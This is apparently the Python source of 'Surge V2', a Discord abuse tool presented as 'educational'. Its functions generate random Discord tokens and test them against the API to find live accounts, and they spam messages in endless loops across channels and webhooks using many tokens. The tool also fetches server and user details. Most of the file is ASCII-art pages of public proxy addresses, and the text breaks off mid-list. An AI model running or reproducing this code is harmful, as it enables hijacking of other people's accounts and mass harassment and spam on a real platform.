import os
import random
import string
import asyncio
import socket
import discord
import aiohttp
from discord.ext import commands
from aiohttp import ClientSession
from rgbprint import gradient_print, Color

"""
© 2024 Abyzms. All rights reserved.

Surge V2 is intended for educational purposes only.
We provide free proxies, token generators,
and related tools to facilitate learning and experimentation.
Unauthorized use or distribution of this tool for malicious activities is strictly prohibited.
Engaging in skidding or using this tool unethically will reflect poorly on your reputation.
Be responsible and respect intellectual property rights.

"""
def display_main_menu(valid_token_count):
    clear_screen()
    desktop_name = socket.gethostname()
    title = f"SURGE by Abyzms I Eye Tools .gg/ngTjh3QCTH I Tokens: {valid_token_count}"
    set_title(title)
    
    message = f"""
SURGE By Abyzms. Made for users at Eye Tools .gg/ngTjh3QCTH. We are not responsible for damages. Tokens: {valid_token_count}
                                /$$$$$$  /$$   /$$ /$$$$$$$   /$$$$$$  /$$$$$$$$
                               /$$__  $$| $$  | $$| $$__  $$ /$$__  $$| $$_____/
                              | $$  \__/| $$  | $$| $$  \ $$| $$  \__/| $$      
                              |  $$$$$$ | $$  | $$| $$$$$$$/| $$ /$$$$| $$$$$   
                               \____  $$| $$  | $$| $$__  $$| $$|_  $$| $$__/   
                               /$$  \ $$| $$  | $$| $$  \ $$| $$  \ $$| $$      
                              |  $$$$$$/|  $$$$$$/| $$  | $$|  $$$$$$/| $$$$$$$$
                               \______/  \______/ |__/  |__/ \______/ |________/            
                  	   Welcome {desktop_name} to SURGE. Educational uses only ;)
════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════
[1] Token Generator                      [4] Multi-Channel Raider                   [7] Proxies. Amount: 297 in stock
[2] Token Checker                        [5] Fetch Server Info                      [8] Webhook Raider
[3] Single Channel Raider                [6] Fetch User Info                        [9] Server Nuker
════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════

    """
    
    gradient_print(
        message,
        start_color=Color.dark_blue,
        end_color=Color.light_blue
    )

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def set_title(title):
    if os.name == 'nt':
        os.system(f"title {title}")
    else:
        os.system(f"echo -ne \"\033]0;{title}\007\"")

def generate_token():
    prefixes = ['MTI', 'NT']
    prefix = random.choice(prefixes)
    first_part_length = random.randint(24, 26) - len(prefix)
    first_part = prefix + ''.join(random.choices(string.ascii_letters + string.digits, k=first_part_length))
    second_part = ''.join(random.choices(string.ascii_letters + string.digits, k=6))
    third_part_length = random.randint(27, 38)
    third_part = ''.join(random.choices(string.ascii_letters + string.digits, k=third_part_length))
    if random.choice([True, False]):
        dash_position = random.randint(0, third_part_length - 1)
        third_part = third_part[:dash_position] + '-' + third_part[dash_position:]
    token = f"{first_part}.{second_part}.{third_part}"
    return token

async def is_valid_token(token, session):
    url = "https://discord.com/api/v9/users/@me"
    headers = {
        "Authorization": token,
        "Content-Type": "application/json"
    }
    try:
        async with session.get(url, headers=headers) as response:
            return response.status == 200
    except Exception as e:
        print(f"Request failed: {e}")
        return False

async def validate_tokens(token_file_path):
    valid_tokens = []
    async with ClientSession() as session:
        with open(token_file_path, 'r') as file:
            tokens = [line.strip() for line in file.readlines()]
        
        tasks = [is_valid_token(token, session) for token in tokens]
        results = await asyncio.gather(*tasks)
        
        valid_tokens = [token for token, is_valid in zip(tokens, results) if is_valid]
    
    return valid_tokens

async def display_token_status(token, is_valid):
    if is_valid:
        gradient_print(
            f"[:D] Token is valid: {token}",
            start_color=Color.green,
            end_color=Color.white
        )
    else:
        gradient_print(
            f"[!] Token is invalid: {token}",
            start_color=Color.red,
            end_color=Color.white
        )

async def generate_and_check_tokens():
    async with ClientSession() as session:
        while True:
            token = generate_token()
            is_valid = await is_valid_token(token, session)
            await display_token_status(token, is_valid)
            await asyncio.sleep(0.1) 

async def send_message_with_tokens(valid_tokens, channel_id, message):
    url = f"https://discord.com/api/v9/channels/{channel_id}/messages"
    
    async def send_message(token, session):
        headers = {
            "Authorization": token,
            "Content-Type": "application/json"
        }
        data = {
            "content": message
        }
        try:
            async with session.post(url, headers=headers, json=data) as response:
                if response.status != 200:
                    print(f"Failed to send message with token {token[:10]}... (status code: {response.status})")
        except Exception as e:
            print(f"Request failed with token {token[:10]}...: {e}")

    async with aiohttp.ClientSession() as session:
        while True:
            tasks = [send_message(token, session) for token in valid_tokens]
            await asyncio.gather(*tasks)
            await asyncio.sleep(0.1)  

async def send_message_to_multiple_channels(valid_tokens, channel_ids, message):
    urls = [f"https://discord.com/api/v9/channels/{channel_id}/messages" for channel_id in channel_ids]
    
    async def send_message(token, session, url):
        headers = {
            "Authorization": token,
            "Content-Type": "application/json"
        }
        data = {
            "content": message
        }
        try:
            async with session.post(url, headers=headers, json=data) as response:
                if response.status != 200:
                    print(f"Failed to send message with token {token[:10]}... to {url} (status code: {response.status})")
        except Exception as e:
            print(f"Request failed with token {token[:10]}... to {url}: {e}")

    async with aiohttp.ClientSession() as session:
        while True:
            tasks = [send_message(token, session, url) for token in valid_tokens for url in urls]
            await asyncio.gather(*tasks)
            await asyncio.sleep(0.1)  


async def fetch_server_info(token, server_id):
    url = f"https://discord.com/api/v9/guilds/{server_id}"
    headers = {
        "Authorization": token,
        "Content-Type": "application/json"
    }
    async with ClientSession() as session:
        try:
            async with session.get(url, headers=headers) as response:
                if response.status == 200:
                    server_info = await response.json()
                    print("Server Info:")
                    print(f"Name: {server_info['name']}")
                    print(f"ID: {server_info['id']}")
                    print(f"Region: {server_info['region']}")
                    print(f"Member Count: {server_info['approximate_member_count']}")
                    print(f"Verification Level: {server_info['verification_level']}")
                else:
                    print(f"Failed to fetch server info. Status code: {response.status}")
        except Exception as e:
            print(f"Request failed: {e}")
    await asyncio.sleep(5)  

async def fetch_user_info(token, user_id):
    url = f"https://discord.com/api/v9/users/{user_id}"
    headers = {
        "Authorization": token,
        "Content-Type": "application/json"
    }
    async with ClientSession() as session:
        try:
            async with session.get(url, headers=headers) as response:
                if response.status == 200:
                    user_info = await response.json()
                    print("User Info:")
                    print(f"Username: {user_info['username']}")
                    print(f"Discriminator: {user_info['discriminator']}")
                    print(f"ID: {user_info['id']}")
                    print(f"Avatar: {user_info['avatar']}")
                else:
                    print(f"Failed to fetch user info. Status code: {response.status}")
        except Exception as e:
            print(f"Request failed: {e}")
    await asyncio.sleep(5) 

async def send_message_to_webhook(webhook_url, message):
    async with ClientSession() as session:
        headers = {
            "Content-Type": "application/json"
        }
        data = {
            "content": message
        }
        try:
            await session.post(webhook_url, headers=headers, json=data)
        except Exception as e:
            print(f"Request failed: {e}")

async def handle_webhook_raider(valid_tokens):
    clear_screen()
    webhook_url = input("Enter the webhook URL: ").strip()
    message = input("Enter the message to send: ").strip()
    for token in valid_tokens:
        await send_message_to_webhook(webhook_url, message)
        await asyncio.sleep(0.1)  

import os
import asyncio

async def handle_proxies():
    page1 = """
 .d8888b.  888     888 8888888b.   .d8888b.  8888888888      8888888888 8888888b.  8888888888 8888888888 
d88P  Y88b 888     888 888   Y88b d88P  Y88b 888             888        888   Y88b 888        888        
Y88b.      888     888 888    888 888    888 888             888        888    888 888        888        
 "Y888b.   888     888 888   d88P 888        8888888         8888888    888   d88P 8888888    8888888    
    "Y88b. 888     888 8888888P"  888  88888 888             888        8888888P"  888        888        
      "888 888     888 888 T88b   888    888 888             888        888 T88b   888        888        
Y88b  d88P Y88b. .d88P 888  T88b  Y88b  d88P 888             888        888  T88b  888        888        
 "Y8888P"   "Y88888P"  888   T88b  "Y8888P88 8888888888      888        888   T88b 8888888888 8888888888 
                                                                                                        
8888888b.  8888888b.   .d88888b. Y88b   d88P 8888888 8888888888 .d8888b.                                 
888   Y88b 888   Y88b d88P" "Y88b Y88b d88P    888   888       d88P  Y88b                                
888    888 888    888 888     888  Y88o88P     888   888       Y88b.                                     
888   d88P 888   d88P 888     888   Y888P      888   8888888    "Y888b.                                  
8888888P"  8888888P"  888     888   d888b      888   888           "Y88b.                                
888        888 T88b   888     888  d88888b     888   888             "888                                
888        888  T88b  Y88b. .d88P d88P Y88b    888   888       Y88b  d88P                        
888        888   T88b  "Y88888P" d88P   Y88b 8888888 8888888888 "Y8888P"  [Q] Previous page                [E] Next Page
════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════
http://51.89.14.70:80			http://89.145.162.81:3128		http://72.10.160.90:5265
http://51.89.255.67:80			http://49.13.252.196:80			http://111.225.152.229:8089
http://159.203.61.169:3128		socks4://138.117.116.30:44009		socks4://166.0.235.197:39147
socks4://171.221.174.230:10800		http://149.56.148.20:80			http://157.230.188.193:3128
http://67.43.227.226:20913		socks4://94.40.90.49:5678		http://122.9.183.228:8000
http://125.77.25.178:8080		http://72.10.164.178:4107		http://12.186.205.122:80
http://152.26.231.22:9443		http://12.186.205.122:80		http://89.117.152.126:3128
socks4://103.191.196.56:1080		socks4://177.54.147.17:3128		http://72.10.164.178:21435
http://72.10.160.171:20405		http://149.28.134.107:2020		http://176.110.121.90:21776
http://72.10.160.92:8083		http://72.10.160.170:17955		socks4://8.211.51.115:8080
http://67.43.227.226:29553		http://217.13.109.78:80			http://128.199.202.122:3128
http://72.10.160.173:30117		http://23.247.136.245:80		http://89.35.237.187:5678
════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════
    """
    
    page2 = """
 .d8888b.  888     888 8888888b.   .d8888b.  8888888888      8888888888 8888888b.  8888888888 8888888888 
d88P  Y88b 888     888 888   Y88b d88P  Y88b 888             888        888   Y88b 888        888        
Y88b.      888     888 888    888 888    888 888             888        888    888 888        888        
 "Y888b.   888     888 888   d88P 888        8888888         8888888    888   d88P 8888888    8888888    
    "Y88b. 888     888 8888888P"  888  88888 888             888        8888888P"  888        888        
      "888 888     888 888 T88b   888    888 888             888        888 T88b   888        888        
Y88b  d88P Y88b. .d88P 888  T88b  Y88b  d88P 888             888        888  T88b  888        888        
 "Y8888P"   "Y88888P"  888   T88b  "Y8888P88 8888888888      888        888   T88b 8888888888 8888888888 
                                                                                                        
8888888b.  8888888b.   .d88888b. Y88b   d88P 8888888 8888888888 .d8888b.                                 
888   Y88b 888   Y88b d88P" "Y88b Y88b d88P    888   888       d88P  Y88b                                
888    888 888    888 888     888  Y88o88P     888   888       Y88b.                                     
888   d88P 888   d88P 888     888   Y888P      888   8888888    "Y888b.                                  
8888888P"  8888888P"  888     888   d888b      888   888           "Y88b.                                
888        888 T88b   888     888  d88888b     888   888             "888                                
888        888  T88b  Y88b. .d88P d88P Y88b    888   888       Y88b  d88P                      
888        888   T88b  "Y88888P" d88P   Y88b 8888888 8888888888 "Y8888P"  [Q] Previous page                [E] Next Page
════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════
http://51.89.14.70:80              	http://72.10.164.178:4107        	http://72.10.164.178:21435
http://89.145.162.81:3128          	http://152.26.231.22:9443        	http://72.10.160.171:20405
http://51.89.255.67:80             	http://72.10.160.90:5265         	http://149.28.134.107:2020
http://49.13.252.196:80            	http://111.225.152.229:8089      	http://176.110.121.90:21776
http://159.203.61.169:3128         	socks4://166.0.235.197:39147     	http://72.10.160.92:8083
socks4://138.117.116.30:44009      	http://157.230.188.193:3128      	http://72.10.160.170:17955
socks4://171.221.174.230:10800     	http://122.9.183.228:8000        	http://67.43.227.226:29553
http://149.56.148.20:80            	http://12.186.205.122:80         	http://217.13.109.78:80
http://67.43.227.226:20913         	http://89.117.152.126:3128       	socks4://8.211.51.115:8080
socks4://94.40.90.49:5678          	socks4://103.191.196.56:1080     	http://128.199.202.122:3128
http://125.77.25.178:8080          	socks4://177.54.147.17:3128      	http://72.10.160.173:30117
════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════
"""
    page3 = """
 .d8888b.  888     888 8888888b.   .d8888b.  8888888888      8888888888 8888888b.  8888888888 8888888888 
d88P  Y88b 888     888 888   Y88b d88P  Y88b 888             888        888   Y88b 888        888        
Y88b.      888     888 888    888 888    888 888             888        888    888 888        888        
 "Y888b.   888     888 888   d88P 888        8888888         8888888    888   d88P 8888888    8888888    
    "Y88b. 888     888 8888888P"  888  88888 888             888        8888888P"  888        888        
      "888 888     888 888 T88b   888    888 888             888        888 T88b   888        888        
Y88b  d88P Y88b. .d88P 888  T88b  Y88b  d88P 888             888        888  T88b  888        888        
 "Y8888P"   "Y88888P"  888   T88b  "Y8888P88 8888888888      888        888   T88b 8888888888 8888888888 
                                                                                                        
8888888b.  8888888b.   .d88888b. Y88b   d88P 8888888 8888888888 .d8888b.                                 
888   Y88b 888   Y88b d88P" "Y88b Y88b d88P    888   888       d88P  Y88b                                
888    888 888    888 888     888  Y88o88P     888   888       Y88b.                                     
888   d88P 888   d88P 888     888   Y888P      888   8888888    "Y888b.                                  
8888888P"  8888888P"  888     888   d888b      888   888           "Y88b.                                
888        888 T88b   888     888  d88888b     888   888             "888                                
888        888  T88b  Y88b. .d88P d88P Y88b    888   888       Y88b  d88P                   
888        888   T88b  "Y88888P" d88P   Y88b 8888888 8888888888 "Y8888P"  [Q] Previous page                [E] Next Page
════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════
http://23.247.136.245:80           	socks4://83.234.147.166:6363      	http://67.43.227.227:13107
http://89.35.237.187:5678          	http://185.164.136.123:80         	http://67.43.227.227:21821
socks4://162.241.204.101:48643     	http://125.77.25.177:8080         	http://67.43.227.226:20577
socks4://137.59.7.104:5648         	http://67.43.228.253:30591        	http://64.23.223.154:80
http://212.107.28.120:80           	http://115.223.11.212:8103        	http://220.248.70.237:9002
socks4://148.72.210.123:7749       	http://13.83.94.137:3128          	http://72.10.164.178:23521
http://152.26.231.86:9443          	http://216.10.247.145:3128        	socks4://142.54.226.214:4145
http://103.127.1.130:80            	socks4://116.118.98.26:5678       	http://47.89.184.18:3128
socks4://149.129.255.179:9098      	socks4://199.229.254.129:4145     	http://72.10.160.170:21157
http://72.10.164.178:32733         	http://103.153.154.6:80           	socks4://8.211.51.115:8008
http://72.10.160.90:31055          	http://178.250.88.254:80          	http://72.10.160.171:31147
════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════
"""
    page4 = """
 .d8888b.  888     888 8888888b.   .d8888b.  8888888888      8888888888 8888888b.  8888888888 8888888888 
d88P  Y88b 888     888 888   Y88b d88P  Y88b 888             888        888   Y88b 888        888        
Y88b.      888     888 888    888 888    888 888             888        888    888 888        888        
 "Y888b.   888     888 888   d88P 888        8888888         8888888    888   d88P 8888888    8888888    
    "Y88b. 888     888 8888888P"  888  88888 888             888        8888888P"  888        888        
      "888 888     888 888 T88b   888    888 888             888        888 T88b   888        888        
Y88b  d88P Y88b. .d88P 888  T88b  Y88b  d88P 888             888        888  T88b  888        888        
 "Y8888P"   "Y88888P"  888   T88b  "Y8888P88 8888888888      888        888   T88b 8888888888 8888888888 
                                                                                                        
8888888b.  8888888b.   .d88888b. Y88b   d88P 8888888 8888888888 .d8888b.                                 
888   Y88b 888   Y88b d88P" "Y88b Y88b d88P    888   888       d88P  Y88b                                
888    888 888    888 888     888  Y88o88P     888   888       Y88b.                                     
888   d88P 888   d88P 888     888   Y888P      888   8888888    "Y888b.                                  
8888888P"  8888888P"  888     888   d888b      888   888           "Y88b.                                
888        888 T88b   888     888  d88888b     888   888             "888                                
888        888  T88b  Y88b. .d88P d88P Y88b    888   888       Y88b  d88P                    
888        888   T88b  "Y88888P" d88P   Y88b 8888888 8888888888 "Y8888P"  [Q] Previous page                [E] Next Page
════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════
http://223.113.80.158:9091      	http://103.49.202.252:80         	socks4://123.57.1.16:5555
http://89.35.237.187:8080       	http://152.26.231.42:9443        	socks4://141.101.120.210:80
http://72.10.164.178:17131      	socks4://200.125.44.242:4145     	socks4://47.89.159.212:8081
http://103.162.63.198:8181      	http://43.132.124.11:3128        	http://67.43.227.229:20597
http://128.199.202.122:8080     	socks4://200.55.3.124:999        	http://12.186.205.120:80
http://47.91.104.88:3128        	http://72.10.160.90:27933        	http://47.88.31.196:8080
http://116.114.20.148:3128      	http://72.10.160.174:3169        	http://191.101.78.207:3128
http://103.159.46.41:83         	socks5://8.220.204.215:9098      	http://115.223.11.212:50000
http://67.43.228.253:1253       	socks4://47.89.159.212:8443      	http://139.255.33.242:3128
http://111.225.153.14:8089      	http://111.225.153.18:8089       	http://191.243.46.2:18283
http://67.43.236.20:4305        	http://201.149.100.32:8085       	http://67.43.227.227:28717
════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════
"""
    page5 = """
 .d8888b.  888     888 8888888b.   .d8888b.  8888888888      8888888888 8888888b.  8888888888 8888888888 
d88P  Y88b 888     888 888   Y88b d88P  Y88b 888             888        888   Y88b 888        888        
Y88b.      888     888 888    888 888    888 888             888        888    888 888        888        
 "Y888b.   888     888 888   d88P 888        8888888         8888888    888   d88P 8888888    8888888    
    "Y88b. 888     888 8888888P"  888  88888 888             888        8888888P"  888        888        
      "888 888     888 888 T88b   888    888 888             888        888 T88b   888        888        
Y88b  d88P Y88b. .d88P 888  T88b  Y88b  d88P 888             888        888  T88b  888        888        
 "Y8888P"   "Y88888P"  888   T88b  "Y8888P88 8888888888      888        888   T88b 8888888888 8888888888 
                                                                                                        
8888888b.  8888888b.   .d88888b. Y88b   d88P 8888888 8888888888 .d8888b.                                 
888   Y88b 888   Y88b d88P" "Y88b Y88b d88P    888   888       d88P  Y88b                                
888    888 888    888 888     888  Y88o88P     888   888       Y88b.                                     
888   d88P 888   d88P 888     888   Y888P      888   8888888    "Y888b.                                  
8888888P"  8888888P"  888     888   d888b      888   888           "Y88b.                                
888        888 T88b   888     888  d88888b     888   888             "888                                
888        888  T88b  Y88b. .d88P d88P Y88b    888   888       Y88b  d88P                    
888        888   T88b  "Y88888P" d88P   Y88b 8888888 8888888888 "Y8888P"  [Q] Previous page                [E] Next Page
════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════
http://67.43.227.227:8187        	http://47.74.40.128:7788        	http://72.10.164.178:9833
http://160.86.242.23:8080        	http://183.36.24.13:3128        	http://194.5.25.34:443
http://72.10.164.178:29389       	http://67.43.228.253:16241      	http://124.104.145.185:3128
http://135.181.154.225:80        	socks4://47.121.182.88:8008     	http://67.43.236.20:14255
socks4://27.72.139.10:5657       	socks4://27.79.82.62:15166      	http://212.112.113.178:3128
socks4://66.29.128.243:48604     	http://62.33.53.248:3128        	http://102.0.5.152:8080
http://160.248.7.177:80          	http://152.26.229.88:9443       	http://1.179.217.11:8080
http://72.10.164.178:5915        	socks4://47.90.167.27:8081      	http://38.156.72.16:8080
http://189.240.60.169:9090       	http://103.164.213.78:8088      	http://181.212.41.172:999
http://72.10.160.90:21027        	http://67.43.236.20:11697       	socks4://103.120.202.53:5678
http://72.10.160.90:5429         	http://157.100.9.237:999        	http://203.202.253.108:5020
════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════
"""
    page6 = """
 .d8888b.  888     888 8888888b.   .d8888b.  8888888888      8888888888 8888888b.  8888888888 8888888888 
d88P  Y88b 888     888 888   Y88b d88P  Y88b 888             888        888   Y88b 888        888        
Y88b.      888     888 888    888 888    888 888             888        888    888 888        888        
 "Y888b.   888     888 888   d88P 888        8888888         8888888    888   d88P 8888888    8888888    
    "Y88b. 888     888 8888888P"  888  88888 888             888        8888888P"  888        888        
      "888 888     888 888 T88b   888    888 888             888        888 T88b   888        888        
Y88b  d88P Y88b. .d88P 888  T88b  Y88b  d88P 888             888        888  T88b  888        888        
 "Y8888P"   "Y88888P"  888   T88b  "Y8888P88 8888888888      888        888   T88b 8888888888 8888888888 
                                                                                                        
8888888b.  8888888b.   .d88888b. Y88b   d88P 8888888 8888888888 .d8888b.                                 
888   Y88b 888   Y88b d88P" "Y88b Y88b d88P    888   888       d88P  Y88b                                
888    888 888    888 888     888  Y88o88P     888   888       Y88b.                                     
888   d88P 888   d88P 888     888   Y888P      888   8888888    "Y888b.                                  
8888888P"  8888888P"  888     888   d888b      888   888           "Y88b.                                
888        888 T88b   888     888  d88888b     888   888             "888                                
888        888  T88b  Y88b. .d88P d88P Y88b    888   888       Y88b  d88P                     
888        888   T88b  "Y88888P" d88P   Y88b 8888888 8888888888 "Y8888P"  [Q] Previous page                [E] Next Page
════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════
http://67.43.236.20:1135          	http://109.68.148.37:3128         	http://108.181.56.101:3128
socks4://148.66.129.172:55827     	http://217.52.247.77:1981         	socks4://149.129.255.179:3128
socks4://213.14.32.73:4153        	http://47.251.87.74:8080          	http://192.73.244.36:80
socks4://74.56.228.180:4145       	http://103.234.31.58:8080         	http://158.140.169.9:8081
http://67.43.236.20:28779         	http://67.43.228.253:28337        	http://12.176.231.147:80
http://208.87.243.199:9898        	http://177.32.153.62:8080         	http://185.232.169.108:4444
socks4://8.211.51.115:80          	http://183.234.215.11:8443        	http://188.166.197.129:3128
http://67.43.228.250:25975        	socks4://86.57.179.4:8080         	socks4://184.170.249.65:4145
http://137.116.142.82:80          	socks4://72.206.181.105:64935     	http://72.10.160.171:32923
http://60.199.29.42:8111          	http://154.16.146.44:80           	http://67.43.228.250:8545
http://165.16.67.238:8080         	http://155.94.241.133:3128        	http://133.18.234.13:80
════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════
"""
    page7 = """
 .d8888b.  888     888 8888888b.   .d8888b.  8888888888      8888888888 8888888b.  8888888888 8888888888 
d88P  Y88b 888     888 888   Y88b d88P  Y88b 888             888        888   Y88b 888        888        
Y88b.      888     888 888    888 888    888 888             888        888    888 888        888        
 "Y888b.   888     888 888   d88P 888        8888888         8888888    888   d88P 8888888    8888888    
    "Y88b. 888     888 8888888P"  888  88888 888             888        8888888P"  888        888        
      "888 888     888 888 T88b   888    888 888             888        888 T88b   888        888        
Y88b  d88P Y88b. .d88P 888  T88b  Y88b  d88P 888             888        888  T88b  888        888        
 "Y8888P"   "Y88888P"  888   T88b  "Y8888P88 8888888888      888        888   T88b 8888888888 8888888888 
                                                                                                        
8888888b.  8888888b.   .d88888b. Y88b   d88P 8888888 8888888888 .d8888b.                                 
888   Y88b 888   Y88b d88P" "Y88b Y88b d88P    888   888       d88P  Y88b                                
888    888 888    888 888     888  Y88o88P     888   888       Y88b.                                     
888   d88P 888   d88P 888     888   Y888P      888   8888888    "Y888b.                                  
8888888P"  8888888P"  888     888   d888b      888   888           "Y88b.                                
888        888 T88b   888     888  d88888b     888   888             "888                                
888        888  T88b  Y88b. .d88P d88P Y88b    888   888       Y88b  d88P                     
888        888   T88b  "Y88888P" d88P   Y88b 8888888 8888888888 "Y8888P"  [Q] Previous page                [E] Next Page
════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════
http://124.104.149.53:8081     	http://47.251.87.74:80            	http://67.43.236.19:7407
http://47.74.152.29:8888       	socks4://108.175.23.137:13135     	http://72.10.160.90:4337
http://161.97.131.23:8899      	http://103.83.232.122:80          	socks4://199.127.176.139:64312
http://91.229.28.105:3128      	http://203.111.253.40:8080        	socks4://47.21.116.165:8080
http://103.157.58.186:8080     	socks4://8.137.13.191:9999        	http://119.18.149.147:5020
http://64.227.134.208:80       	http://195.26.252.23:3128         	http://72.10.160.90:23343
http://195.114.209.50:80       	http://1.2.220.29:8080            	socks4://103.134.38.89:5678
http://45.124.87.19:3128       	http://99.8.168.181:32770         	http://103.165.157.167:8080
http://67.43.236.20:2461       	http://61.129.2.212:8080          	http://82.200.80.118:8080
http://95.164.113.107:80       	http://205.185.125.235:3128       	http://198.49.68.80:80
http://103.184.66.37:8181      	http://67.43.228.250:6695         	http://27.10.100.192:8118
════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════
"""
    page8 = """
 .d8888b.  888     888 8888888b.   .d8888b.  8888888888      8888888888 8888888b.  8888888888 8888888888 
d88P  Y88b 888     888 888   Y88b d88P  Y88b 888             888        888   Y88b 888        888        
Y88b.      888     888 888    888 888    888 888             888        888    888 888        888        
 "Y888b.   888     888 888   d88P 888        8888888         8888888    888   d88P 8888888    8888888    
    "Y88b. 888     888 8888888P"  888  88888 888             888        8888888P"  888        888        
      "888 888     888 888 T88b   888    888 888             888        888 T88b   888        888        
Y88b  d88P Y88b. .d88P 888  T88b  Y88b  d88P 888             888        888  T88b  888        888        
 "Y8888P"   "Y88888P"  888   T88b  "Y8888P88 8888888888      888        888   T88b 8888888888 8888888888 
                                                                                                        
8888888b.  8888888b.   .d88888b. Y88b   d88P 8888888 8888888888 .d8888b.                                 
888   Y88b 888   Y88b d88P" "Y88b Y88b d88P    888   888       d88P  Y88b                                
888    888 888    888 888     888  Y88o88P     888   888       Y88b.                                     
888   d88P 888   d88P 888     888   Y888P      888   8888888    "Y888b.                                  
8888888P"  8888888P"  888     888   d888b      888   888           "Y88b.                                
888        888 T88b   888     888  d88888b     888   888             "888                                
888        888  T88b  Y88b. .d88P d88P Y88b    888   888       Y88b  d88P                     
888        888   T88b  "Y88888P" d88P   Y88b 8888888 8888888888 "Y8888P"  [Q] Previous page                [E] Next Page
════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════
socks5://117.74.65.207:80      	http://200.174.198.86:8888       	http://183.215.23.242:9091
http://82.102.10.253:80        	http://38.183.146.97:8090        	http://160.248.7.207:3128
http://217.21.78.18:3128       	http://180.94.12.137:8080        	http://103.41.32.182:58080
http://181.233.62.9:999        	http://115.245.181.54:23500      	http://116.68.170.115:8019
http://128.199.193.78:3128     	http://97.76.251.138:8080        	http://191.102.254.50:8081
http://67.43.227.227:25907     	http://35.185.196.38:3128        	http://36.88.13.186:3129
http://103.155.166.93:8181     	socks4://46.214.153.223:5678     	http://201.91.82.155:3128
http://164.52.206.180:80       	http://179.1.134.75:999          	http://67.43.227.227:12461
socks4://162.55.87.48:5566     	http://124.105.48.232:8082       	http://189.240.60.171:9090
http://67.43.228.254:13537     	http://190.94.213.4:999          	http://203.89.8.107:80
http://103.93.93.130:8181      	http://95.216.140.215:80         	http://72.10.164.178:26643
════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════
"""
    page9 = """
 .d8888b.  888     888 8888888b.   .d8888b.  8888888888      8888888888 8888888b.  8888888888 8888888888 
d88P  Y88b 888     888 888   Y88b d88P  Y88b 888             888        888   Y88b 888        888        
Y88b.      888     888 888    888 888    888 888             888        888    888 888        888        
 "Y888b.   888     888 888   d88P 888        8888888         8888888    888   d88P 8888888    8888888    
    "Y88b. 888     888 8888888P"  888  88888 888             888        8888888P"  888        888        
      "888 888     888 888 T88b   888    888 888             888        888 T88b   888        888        
Y88b  d88P Y88b. .d88P 888  T88b  Y88b  d88P 888             888        888  T88b  888        888        
 "Y8888P"   "Y88888P"  888   T88b  "Y8888P88 8888888888      888        888   T88b 8888888888 8888888888 
                                                                                                        
8888888b.  8888888b.   .d88888b. Y88b   d88P 8888888 8888888888 .d8888b.                                 
888   Y88b 888   Y88b d88P" "Y88b Y88b d88P    888   888       d88P  Y88b                                
888    888 888    888 888     888  Y88o88P     888   888       Y88b.                                     
888   d88P 888   d88P 888     888   Y888P      888   8888888    "Y888b.                                  
8888888P"  8888888P"  888     888   d888b      888   888           "Y88b.                                
888        888 T88b   888     888  d88888b     888   888             "888                                
888        888  T88b  Y88b. .d88P d88P Y88b    888   888       Y88b  d88P                       
888        888   T88b  "Y88888P" d88P   Y88b 8888888 8888888888 "Y8888P"  [Q] Previous page                [E] Next Page
════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════
http://223.204.49.15:8080      	http://190.211.87.23:999          	http://5.32.37.218:8080
http://4.236.183.37:8080       	http://37.252.13.248:3128         	socks4://8.137.13.191:8443
http://128.199.136.56:3128     	http://124.6.155.170:3131         	http://123.205.24.244:8382
http://67.43.236.20:4021       	socks4://1.15.62.12:5678          	http://203.189.96.232:80
http://203.98.76.2:3128        	http://83.169.17.201:80           	socks4://110.223.7.135:8081
http://189.240.60.164:9090     	socks4://103.30.0.249:4145        	http://95.217.155.116:3128
http://52.172.55.7:80          	http://45.133.75.125:3128         	http://103.25.210.141:3319
http://103.178.21.74:8090      	socks4://203.96.177.211:12514     	http://91.189.177.189:3128
http://103.131.18.183:8080     	socks4://67.213.212.36:63248      	http://103.165.157.235:8090
http://67.43.228.253:30467     	socks4://211.194.214.128:9050     	http://67.43.236.18:30785
http://103.171.244.54:8088     	http://8.242.154.34:999           	http://67.43.228.253:1243
════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════
"""
    page10 = """
 .d8888b.  888     888 8888888b.   .d8888b.  8888888888      8888888888 8888888b.  8888888888 8888888888 
d88P  Y88b 888     888 888   Y88b d88P  Y88b 888             888        888   Y88b 888        888        
Y88b.      888     888 888    888 888    888 888             888        888    888 888        888        
 "Y888b.   888     888 888   d88P 888        8888888         8888888    888   d88P 8888888    8888888    
    "Y88b. 888     888 8888888P"  888  88888 888             888        8888888P"  888        888        
      "888 888     888 888 T88b   888    888 888             888        888 T88b   888        888        
Y88b  d88P Y88b. .d88P 888  T88b  Y88b  d88P 888             888        888  T88b  888        888        
 "Y8888P"   "Y88888P"  888   T88b  "Y8888P88 8888888888      888        888   T88b 8888888888 8888888888 
                                                                                                        
8888888b.  8888888b.   .d88888b. Y88b   d88P 8888888 8888888888 .d8888b.                                 
888   Y88b 888   Y88b d88P" "Y88b Y88b d88P    888   888       d88P  Y88b                                
888    888 888    888 888     888  Y88o88P     888   888       Y88b.                                     
888   d88P 888   d88P 888     888   Y888P      888   8888888    "Y888b.                                  
8888888P"  8888888P"  888     888   d888b      888   888           "Y88b.                                
888        888 T88b   888     888  d88888b     888   888             "888                                
888        888  T88b  Y88b. .d88P d88P Y88b    888   888       Y88b  d88P                         
888        888   T88b  "Y88888P" d88P   Y88b 8888888 8888888888 "Y8888P"  [Q] Previous page                [E] Next Page
════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════
http://1.4.198.132:8081         	http://103.126.87.120:8082      	http://23.95.216.78:34561
http://101.255.151.178:1111     	http://72.10.160.174:8197       	http://101.128.93.144:8090
